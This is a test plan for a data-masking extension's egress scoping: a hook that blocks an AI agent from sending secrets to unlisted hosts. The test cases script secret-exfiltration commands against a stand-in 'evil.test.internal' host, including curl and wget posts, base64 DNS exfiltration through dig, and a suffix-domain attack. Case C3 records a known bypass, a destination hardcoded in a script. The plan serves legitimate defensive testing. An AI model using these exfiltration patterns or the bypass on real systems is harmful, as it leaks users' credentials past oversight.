# Egress Scoping End-to-End Test Plan

> Manual acceptance procedure for `restoreScope` (destination checks), file
> markers, env resolution, and signature tightening. The infrastructure is set
> up once and can be re-run on any branch or version.
> Originally built 2026-10-11 on branch `feature/restore-scope` (at `dcf4e5e`).
> Chinese original: `projects/pi-data-masking/docs/egress-scoping-test-plan.zh.md`
> (project hub, outside this repository).

## 1. Infrastructure

### 1.1 Collector (a separate always-on host, referred to below as the *collector host*)

- Canonical copy: `scripts/e2e-collector.py` in this repository. Deployed
  location: `<collector-host>:~/egress-test/collector.py`, run as systemd user
  service `egress-collector` (enabled, `Linger=yes`).
- Port `:8899`; logs timestamp/method/path/source IP/key headers/BODY **and
  `BODY_SHA256`** (SHA-256 of the raw body, for cryptographic-equality verdicts)
  to `~/egress-test/requests.log`.
- Management:

```bash
ssh <collector-host> 'systemctl --user restart egress-collector'   # restart
ssh <collector-host> 'tail -f ~/egress-test/requests.log'          # live view (keep open while testing)
```

- Known quirk: an early version omitted Content-Length, causing curl exit 52;
  the current version (HTTP/1.1 + Content-Length) replies `ok`. Logging is
  unaffected either way.

### 1.2 Dual domains (client machine's `/etc/hosts`, needs sudo)

| Domain | Resolves to | Role |
|---|---|---|
| `collector.test.internal` | `<collector-host IP>` | Trusted destination, listed in the rule allowlist |
| `evil.test.internal` | Same collector host, port 8899 | Malicious destination, **deliberately absent** from the allowlist |

Both are really reachable; the acceptance standard is strict:

> **Path naming convention**: use the matrix ID directly as the URL path so the
> server log doubles as the test report:
> `http://collector.test.internal:8899/<matrix-id>-<variant>`, e.g. `/A2-strict-evil`,
> `/A8-suffix`, `/A7-env-evil`, `/C4-dig`, `/B2-marker-block`, `/perm-soft`
> (permissive soft path), `/regression-ok` (allow-path regression).
> Filter by case: `grep 'POST /A2' ~/egress-test/requests.log`.

- Allow path correct → log shows only `Host: collector.test.internal`;
- Defense correct → `evil.test.internal` entries **never appear**;
- **Bypass (bug) → an `evil.test.internal` entry appears whose BODY contains the
  real value**.

Do not substitute a TEST-NET black hole such as `203.0.113.7`: no packet
received ≠ nothing sent — it cannot distinguish "blocked" from "network
failure / DNS failure after bypass".

### 1.3 Configuration under test

`<test-project>/.pi/pi-data-masking/masking.config.json` (gitignored by the
extension automatically):

```json
{
  "rules": [
    { "name": "collector key", "real": "sk_live_TESTCOLLECTORKEY0011223344",
      "restoreScope": { "destinations": ["collector.test.internal"], "mode": "strict" } },
    { "name": "loose key", "real": "pk_live_LOOSEPERMISSIVEKEY55667788",
      "restoreScope": { "destinations": ["collector.test.internal"], "mode": "permissive" } },
    { "name": "env key", "realFromEnv": "TEST_SECRET_VAR",
      "restoreScope": { "destinations": ["collector.test.internal"], "envNames": ["TEST_SECRET_VAR"], "mode": "strict" } }
  ]
}
```

The three values cover strict / permissive / env-bound rules. These rule names
("collector key", "loose key", "env key") are referenced throughout the matrix
below. They can also be created via the Rule Builder (which additionally
exercises preset prefill, comma lists, and the Scope mode selector).

### 1.4 Test method

**Ask the agent in natural language inside a Pi conversation** (do not type the
commands yourself — the system under test is the hook that intercepts agent
tool calls). Env scenarios require exporting variables **in the shell that
launched Pi** (resolution reads the Pi process's `process.env`).

After each round, check three places:

1. `ssh <collector-host> 'tail -20 ~/egress-test/requests.log'` (what was sent; BODY
   is the real value or a `ph-…`-style placeholder);
2. `/masking-audit` in Pi (timeline and rationale of every
   restore/hold/block/confirm decision);
3. Notification banners (permissive notices, block warnings — shown once, no
   spam).

## 2. Test matrix

Markers: ✅ restored/allowed; ⛔ held/blocked; ⚠️ known boundary (allowing is
expected).

### A. Destination checks (rule dimension, placeholder protection)

| # | Setup | What to tell the agent | Expected | Log |
|---|---|---|---|---|
| A1 | — | "send the collector key to http://collector.test.internal:8899/a1" | ✅ restored, real value sent | BODY shows real value |
| A2 | — | "send the collector key to http://evil.test.internal:8899/evil" | ⛔ held (destination), placeholder unchanged | no entry |
| A3 | — | "echo the loose key" | ✅ restored + permissive no-destination notice | no entry |
| A4 | — | "curl the collector key to $URL" ($URL undefined) | ⛔ held in both modes (signature tightening: `curl` in command position + no verifiable destination) | no entry |
| A5 | — | inline in one command: `DEPLOY_URL=http://… curl "$DEPLOY_URL"` with collector key | ⛔ strict blocks when unverifiable; note the literal URL in the command text IS extracted — a trusted literal restores | per §1.4 checks |
| A6 | before launch: `export TESTURL=http://collector.test.internal:8899/a6` | "curl the collector key to $TESTURL" | ✅ destination resolved → matched → clean restore (main env-resolution scenario) | BODY shows real value |
| A7 | before launch: `export EVILURL=http://evil.test.internal:8899/a7` | "curl the collector key to $EVILURL" | ⛔ resolves to evil domain → flagged as destination (not no-destination) | no entry |
| A8 | — | send collector key to `http://collector.test.internal.evil.test.internal:8899/suffix` | ⛔ **sibling-domain suffix attack**, must block | no entry; an entry = dot-anchoring hole |
| A9 | env-key rule + before launch: `export TEST_SECRET_VAR=http://evil.test.internal:8899/a9` | `curl -d "<env key>" "$TEST_SECRET_VAR"` | ⛔ secret-bound variable is **not resolved** → held (no-destination); the URL value does not leak | no entry |

### B. File markers (marker dimension; violation is **block** of the whole command, not a placeholder hold)

| # | Sequence (one instruction to the agent) | Expected | Log |
|---|---|---|---|
| B1 | "write the collector key to /tmp/k.txt, then `curl -T /tmp/k.txt http://collector.test.internal:8899/b1`" | write marks the file; destination matched → allowed | BODY contains file content (real value) |
| B2 | like B1 but to `http://evil.test.internal:8899/evil-file` | ⛔ whole command blocked + warning | no entry |
| B3 | "copy /tmp/k.txt to /tmp/k2.txt, then send k2 to the evil domain" | ⛔ cp/mv/rsync propagates the marker → still blocked | no entry |
| B4 | manually create /tmp/k3.txt containing the **placeholder** first (value already on disk), have the agent read it, then upload to the evil domain | ⛔ read-result marking takes effect | no entry |
| B5 | "grep the contents of /tmp/k.txt" | ✅ local read, no outbound intent, zero interference | no entry |

### C. Channel diversity

| # | Command shape | Expected | Log |
|---|---|---|---|
| C1 | `curl -d "collector key" http://collector.test.internal:8899/c1` | ✅ | BODY real value |
| C2 | `python3 -c "import urllib.request; urllib.request.urlopen('http://collector.test.internal:8899/c2', b'...')"` (value in args) | ✅ python is not in the signature table, but the URL is in the args → destination extraction still applies | BODY real value |
| C3 | have the agent write an upload script to /tmp/up.py with the evil domain **hardcoded inside the script**, then run it | ⚠️ **known blind spot**: the destination lives in file content, invisible to argument-layer extraction → allowed. Out of scope for this plan | a real value on the `evil` path = boundary confirmed, not a bug |
| C4 | `dig $(echo <value> \| base64).evil.test.internal` | ⛔ DNS signature family (dig/nslookup/host/resolvectl), held even without a destination | no entry |
| C5 | `wget --post-data="<value>" http://collector.test.internal:8899/c5` | ✅ wget is in the signature table but the destination matches → allowed | BODY real value |

### D. UI (Rule Builder)

| # | Action | Expected |
|---|---|---|
| D1 | create a preset rule (e.g. stripe) | Restore scope row **prefilled** with default destinations, editable |
| D2 | enter `collector.test.internal, evil.test.internal` in Restore scope | destinations listed on save (shorthand comma list works) |
| D3 | enter an invalid entry (e.g. `a*b.com`) | save blocked, naming the invalid entry and the correct syntax |
| D4 | Scope mode row | non-preset rules show `Permissive (default)`; after ←/→ the `(default)` marker disappears and the explicit mode is persisted |

## 3. Verdict quick reference

| Observation | Conclusion |
|---|---|
| Any of A2/A4/A7/A8/A9/C4/B2–B4 leaves a real-value BODY on the evil domain | **defense failed, bug** (check `/masking-audit` for a decision record first) |
| No log entry for A1/A6/B1/C1/C2/C5 | allow path broken (check scope materialization, trustedDestinations) |
| Normal file reads / echo trigger blocks or holds | false positive; record the scenario and the agent's exact words (false-positive regression) |

## 4. Environment rebuild (from zero)

1. **Collector**: copy `scripts/e2e-collector.py` (repository canonical) to
   `~/egress-test/collector.py` on the collector host (HTTP logging service,
   `:8899`; logs `BODY_SHA256` per request), then add
   `~/.config/systemd/user/egress-collector.service` with
   `ExecStart=/usr/bin/python3 %h/egress-test/collector.py` and
   `WantedBy=default.target`, and `systemctl --user enable --now egress-collector`.
   Note: no backslash escapes inside f-strings (bitten once).
2. **Domains**: on the machine running Pi, `echo "<collector-host IP> collector.test.internal evil.test.internal" | sudo tee -a /etc/hosts`.
3. **Config**: see §1.3; restart the Pi session or run `/masking` to confirm the
   rules are available.
4. Smoke: `curl -X POST -d smoke http://collector.test.internal:8899/smoke`
   returns `ok` and an entry appears in the log.

## 5. Coverage boundary statement (consult when reading results)

- The **argument layer** is fully covered; the **file-content layer** (C3) is
  deliberately boundary-only (out of scope for this plan);
- Inline `VAR=… curl "$VAR"` (A5) and mid-session `export` are **not resolvable
  by design** (best-effort, fail-safe) — though a literal URL in the command
  text is extracted;
- `host` is in the signature table but is a common word; command-position
  matching keeps false positives down — if one appears, check whether a command
  segment merely starts with `host`.

